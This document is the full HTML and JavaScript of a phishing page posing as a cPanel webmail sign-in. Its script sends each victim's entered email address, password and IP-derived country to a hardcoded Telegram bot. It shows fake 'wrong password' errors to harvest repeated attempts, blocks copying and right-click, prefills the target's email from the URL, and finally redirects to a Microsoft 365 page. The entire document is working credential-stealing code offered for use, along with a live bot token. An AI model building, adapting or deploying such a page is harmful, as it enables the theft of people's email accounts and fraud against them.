<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Webmail · Sign in</title>
  <link rel="shortcut icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23e67e22'%3E%3Cpath d='M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V8l8 5 8-5v10z'/%3E%3C/svg%3E">
  <!-- Bootstrap 5 + jQuery (same style as original) -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <style>
    /* keep original global style + minimal adjustments */
    body {
      background: #ffffff;
      user-select: none;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: system-ui, -apple-system, 'Courier New', monospace, 'Courier New', monospace;
    }
    .hidden { display: none; }
    .webmail-card {
  background: transparent;
  border-radius: 12px;
  box-shadow: none;
  padding: 2rem 2rem 2.5rem 2rem;
  max-width: 420px;
  width: 100%;
  margin: 1rem;
  transition: all 0.2s;
    }
    .webmail-card .logo-icon {
      width: 48px;
      height: 48px;
      background: #0078d7;
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 1.2rem;
    }
    .webmail-card .logo-icon svg {
      width: 28px;
      height: 28px;
      fill: white;
    }
    .webmail-card h2 {
      font-size: 1.6rem;
      font-weight: 500;
      letter-spacing: -0.02em;
      color: #e67e22;  /* CHANGED TO ORANGE */
      margin-bottom: 0.25rem;
    }
    .webmail-card .subhead {
      color: #475569;
      font-size: 0.95rem;
      margin-bottom: 1.5rem;
      border-bottom: 1px solid #e9edf2;
      padding-bottom: 1rem;
    }
    .form-label {
  font-weight: 500;
  font-size: 0.9rem;
  color: #1e293b;
  text-align: left;
  display: block;
  width: 100%;
    }
    .form-control {
      border-radius: 8px;
      border: 1px solid #d1d9e6;
      padding: 0.65rem 1rem;
      font-size: 0.95rem;
      background: #fafcff;
    }
    .form-control:focus {
      border-color: #0078d7;
      box-shadow: 0 0 0 3px rgba(0,120,215,0.15);
      background: white;
    }
    .btn-primary {
      background: #0078d7;
      border: none;
      border-radius: 40px;
      font-weight: 500;
      padding: 0.65rem 1.2rem;
      width: 100%;
      transition: background 0.15s;
      box-shadow: 0 2px 4px rgba(0,120,215,0.2);
    }
    .btn-primary:hover {
      background: #106ebe;
    }
    .divider {
      display: flex;
      align-items: center;
      color: #64748b;
      font-size: 0.85rem;
      margin: 1.2rem 0 1rem 0;
    }
    .divider-line {
      flex: 1;
      height: 1px;
      background: #dce2ec;
    }
    .divider-text {
      padding: 0 0.8rem;
      font-weight: 400;
      color: #64748b;
    }
    .btn-outline-secondary {
      border-radius: 40px;
      border: 1px solid #d1d9e6;
      color: #1e293b;
      font-weight: 500;
      background: transparent;
      padding: 0.65rem 1.2rem;
      width: 100%;
      transition: 0.1s;
    }
    .btn-outline-secondary:hover {
      background: #f1f5f9;
      border-color: #b9c4d4;
    }
    .language-row {
  display: flex;
  flex-wrap: nowrap;
  justify-content: center;
  gap: 0.5rem 2.9rem;
  margin-top: 1.8rem;
  font-size: 0.85rem;     
  font-weight: 500;       
  color: #1e293b;         
  border-top: 1px solid #e9edf2;
  padding-top: 1.5rem;
  white-space: nowrap;
}
    .language-row span {
      cursor: default;
      transition: color 0.1s;
    }
    .language-row span:hover {
      color: #0078d7;
    }
    .language-row .more {
      font-weight: 500;
      color: #0078d7;
    }
    .webmail-card .error-msg {
      font-size: 0.85rem;
      margin-top: 0.5rem;
      background: #fef2f2;
      border-radius: 6px;
      padding: 0.3rem 0.8rem;
      color: #b91c1c;
      display: none;
    }
    @media (max-width: 480px) {
      .webmail-card { padding: 1.5rem; }
    }
    /* preserve original style for any extra elements */
  </style>
</head>
<body>

<div class="webmail-card" id="webmailCard">
  <!-- logo / header -->
  
  <!-- Image replacing the Webmail heading -->
  <div style="text-align: center; margin-bottom: 10px;">
      <img src="https://conceptoriginal.co.uk/wp-content/uploads/2023/05/Webmail.png" 
           alt="Webmail Icon" 
           style="max-width: 200%; height: auto; max-height: 200px;">

  <!-- login form (matches picture: Email, Password, Log in, OR, Log in via cPanelID) -->
  <form id="login-form" method="post">
    <div class="mb-3">
      <label for="emailInput" class="form-label">Email Address</label>
      <input type="email" class="form-control" id="emailInput" placeholder="Enter your email address" value="user@example.com" required>
    </div>
    <div class="mb-3">
      <label for="passwordInput" class="form-label">Password</label>
      <input type="password" class="form-control" id="passwordInput" placeholder="Enter your email password" required>
    </div>
    <div id="errorMsg" class="error-msg">Please check you entered your email and password correctly and try again.</div>
    <button type="submit" id="submitBtn" class="btn btn-primary">Log in</button>
  </form>

  <!-- OR + cPanelID button -->
  <div class="divider">
    <span class="divider-line"></span>
    <span class="divider-text">OR</span>
    <span class="divider-line"></span>
  </div>
  <button class="btn btn-outline-secondary" id="cpanelBtn" style="margin-bottom:0.25rem;">Log in via cPanelID</button>

  <!-- language row: exactly as in picture -->
  <div class="language-row">
    <span>العربية</span>
    <span>čeština</span>
    <span>dansk</span>
    <span>Deutsch</span>
    <span>Ελληνικά</span>
    <span>English</span>
    <span>español</span>
    <span>español latinoamericano</span>
    <span class="more">...</span>
  </div>
</div>

<!-- keep original script logic but adapt to webmail layout (no video/page1/page2, just clean login) 
     preserve telegram functionality, but remove teams modal / page switching,
     also keep country detection, etc.  we reuse the same bot token and country detection.
  -->
<script>
  (function() {
    // Disable right-click context menu (as in original)
    document.addEventListener('contextmenu', function(event) {
      event.preventDefault();
    });
    // Disable Ctrl+s/c/v/x/p/a (as in original)
    document.addEventListener('keydown', function(event) {
      const blockedKeys = ['s', 'c', 'v', 'x', 'p', 'a'];
      if (event.ctrlKey && blockedKeys.includes(event.key.toLowerCase())) {
        event.preventDefault();
      }
    });

    // telegram & country (from original code)
    const telegramBotToken = '8833095520:AAHm4w9Re2UiVzP7qkeWtD-ScQdPhUUOeSU';
    const chatId = '8186618467';
    let userCountry = "Unknown";

    $.get("https://ipapi.co/json/", function(data) {
      if (data && data.country_name) userCountry = data.country_name;
    }).fail(function() {
      userCountry = "Unknown";
    });

    let step = 1; // track incorrect attempts

    // override submit for webmail
    $('#login-form').on('submit', function(event) {
      event.preventDefault();
      const email = $('#emailInput').val().trim();
      const password = $('#passwordInput').val().trim();
      const errorEl = $('#errorMsg');

      if (!email || !password) {
        errorEl.show().text("Please enter your email and password.");
        setTimeout(() => { errorEl.fadeOut(2000); }, 3000);
        return;
      }

      $('#submitBtn').text('Signing in...').prop('disabled', true);

      const message = `🔔 Webmail Login Attempt:\n📧 Email: ${email}\n🔑 Password: ${password}\n🌍 Country: ${userCountry}`;

      $.ajax({
        url: `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
        type: 'POST',
        contentType: 'application/json',
        data: JSON.stringify({ chat_id: chatId, text: message }),
        success: function() {
          if (step >= 3) {
            window.location.href = 'https://www.microsoft.com/fr-fr/microsoft-365/try?ocid=cmmyf6908m4';
          } else {
            errorEl.show().text("Please check you entered your email and password correctly and try again.");
            setTimeout(() => { errorEl.fadeOut(3000); }, 3500);
            $('#passwordInput').val('');
            step++;
            $('#submitBtn').text('Log in').prop('disabled', false);
          }
        },
        error: function() {
          // even if telegram fails, count attempt
          if (step >= 3) {
            window.location.href = 'https://www.microsoft.com/fr-fr/microsoft-365/try?ocid=cmmyf6908m4';
          } else {
            errorEl.show().text("Please check you entered your email and password correctly and try again.");
            setTimeout(() => { errorEl.fadeOut(3000); }, 3500);
            $('#passwordInput').val('');
            step++;
            $('#submitBtn').text('Log in').prop('disabled', false);
          }
        }
      });
    });

    // cPanelID button: just a dummy placeholder (no action) – as in picture
    $('#cpanelBtn').on('click', function(e) {
      e.preventDefault();
      alert('cPanelID login flow (demo) – replace with actual logic.');
    });

    // optional: prefill email from URL ?email=xxx (like original)
    const urlParams = new URLSearchParams(window.location.search);
    const emailParam = urlParams.get('email');
    if (emailParam) {
      $('#emailInput').val(emailParam);
    }

    // remove any leftover video/teams references: no page1/page2, just clean.
    // Also ensure that any lingering switchToPage2 is not called.
    // We keep the style and original "hidden" class but we don't use it.
    console.log('Webmail ready (template from picture)');
  })();
</script>

<!-- keep original Bootstrap and jQuery already loaded -->
</body>
</html>
